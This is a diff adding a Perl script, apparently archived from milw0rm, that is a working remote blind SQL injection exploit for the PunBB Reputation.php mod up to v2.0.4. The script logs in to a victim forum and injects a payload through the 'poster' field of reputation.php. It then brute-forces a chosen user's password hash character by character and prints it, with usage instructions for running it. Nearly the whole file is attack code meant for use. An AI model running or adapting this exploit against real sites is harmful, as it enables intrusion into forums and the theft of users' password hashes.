@@ -1,0 +1,149 @@
+#!/usr/bin/perl
+#[0-Day] PunBB Reputation.php Mod <= v2.0.4 Remote Blind SQL Injection Exploit
+#Coded By Dante90, WaRWolFz Crew
+#Bug Discovered By: Dante90, WaRWolFz Crew
+
+use strict;
+use LWP::UserAgent;
+use HTTP::Cookies;
+
+use HTTP::Request::Common;
+use Time::HiRes;
+use IO::Socket;
+
+my ($UserName,$PassWord,$ID) = @ARGV;
+if(@ARGV < 3){
+    &usage();
+    exit();
+}
+my $Message = "";
+my ($Hash,$Time,$Time_Start,$Time_End,$Response);
+my($Start,$End);
+my @chars = (48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
+my $Host = "http://www.victime_site.org/path/"; #Insert Victime Web Site Link
+my $Method = HTTP::Request->new(POST => $Host);
+my $Cookies = new HTTP::Cookies;
+my $HTTP = new LWP::UserAgent(
+            agent => 'Mozilla/5.0',
+            max_redirect => 0,
+            cookie_jar => $Cookies,
+        ) or die $!;
+my $Referrer = "form_sent=1&pid=10174&poster=Dante90, WaRWolFz Crew&method=1&req_message=http://www.warwolfz.com/&submit=Invia";
+my $DefaultTime = request($Referrer);
+
+sub Login(){
+    my $Login = $HTTP->post($Host.'login.php?action=in',
+                [
+                    form_sent        => '1',
+                    redirect_url    => 'forums.php',
+                    req_username    => $UserName,
+                    req_password    => $PassWord,
+                    login => 'Login',
+                ]) || die $!;
+
+    if($Login->content =~ /Logged in successfully./i){
+        return 1;
+    }else{
+        return 0;
+    }
+}
+if (Login() == 1){
+    $Message = " * Logged in as: ".$UserName;
+}elsif (Login() == 0){
+    $Message = " * Login Failed.";
+    refresh($Message, $Host, $DefaultTime, "0", $Hash, $Time, "1");
+    print " * Exploit Failed                                     *\n";
+    print " ------------------------------------------------------ \n";
+    exit;
+}
+
+sub Blind_SQL_Jnjection{
+    my ($dec,$hex) = @_;
+    return "Dante90, WaRWolFz Crew\" OR ASCII(SUBSTRING((SELECT `password` FROM `users` WHERE `id`=${ID}),${dec},1))=${hex}/*";
+}
+
+for(my $I=1; $I<=40; $I++){ #N Hash characters
+    for(my $J=0; $J<=15; $J++){ #0 -> F
+        my $Post = $HTTP->post($Host.'reputation.php?',[
+                    form_sent    => '1',
+                    pid            => '2',
+                    poster        => Blind_SQL_Jnjection($I,$chars[$J]),
+                    method        => '1',
+                    req_message    => 'http://www.warwolfz.com/',
+                    submit        => 'Submit',
+                ]) || die $!;
+        $Time = request($Referrer);
+        refresh($Message, $Host, $DefaultTime, $J, $Hash, $Time, $I);
+        if($Post->content =~ /(The reputation has been successfully changed)/i){
+            syswrite(STDOUT,chr($chars[$J]));
+            $Hash .= chr($chars[$J]);
+            $Time = request($Referrer);
+            refresh($Message, $Host, $DefaultTime, $J, $Hash, $Time, $I);
+            last;
+        }
+    }
+    if($I == 1 && length $Hash < 1 && !$Hash){
+        print " * Exploit Failed                                     *\n";
+        print " ------------------------------------------------------ \n";
+        exit;
+    }
+    if($I == 40){
+        print " * Exploit Successed                                  *\n";
+        print " ------------------------------------------------------\n ";
+        system("pause");
+    }
+}
+
+sub usage{
+    system("cls");
+    {
+        print " \n [0-Day] PunBB Reputation.php Mod <= v2.0.4 Remote Blind SQL Injection Exploit\n";
+        print " ------------------------------------------------------ \n";
+        print " * USAGE:                                             *\n";
+        print " * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n";
+        print " * perl name_exploit.pl [username] [password] [id]    *\n";
+        print " ------------------------------------------------------ \n";
+        print " *         Powered By Dante90, WaRWolFz Crew          *\n";
+        print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";
+        print " ------------------------------------------------------ \n";
+    };
+    exit;
+}
+
+sub request{
+    $Referrer = $_[0];
+    $Method->content_type('application/x-www-form-urlencoded');
+    $Method->content($Referrer);
+    $Start = Time::HiRes::time();
+    $Response = $HTTP->request($Method);
+    $Response->is_success() or die "$Host : ", $Response->message,"\n";
+    $End = Time::HiRes::time();
+    $Time = $End - $Start;
+    return $Time;
+}
+
+sub refresh{
+    system("cls");
+    {
+        print " \n [0-Day] PunBB Reputation.php Mod <= v2.0.4 Remote Blind SQL Injection Exploit\n";
+        print " ------------------------------------------------------ \n";
+        print " * USAGE:                                             *\n";
+        print " * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n";
+        print " * perl name_exploit.pl [username] [password] [id]    *\n";
+        print " ------------------------------------------------------ \n";
+        print " *         Powered By Dante90, WaRWolFz Crew          *\n";
+        print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";
+        print " ------------------------------------------------------ \n";
+    };
+    print $_[0] ."\n";
+    print " * Victime Site: " . $_[1] . "\n";
+    print " * Default Time: " . $_[2] . " seconds\n";
+    print " * BruteForcing Hash: " . chr($chars[$_[3]]) . "\n";
+    print " * BruteForcing N Char Hash: " . $_[6] . "\n";
+    print " * SQL Time: " . $_[5] . " seconds\n";
+    print " * Hash: " . $_[4] . "\n";
+}
+
+#WaRWolFz Crew
+
+# milw0rm.com [2009-07-28]
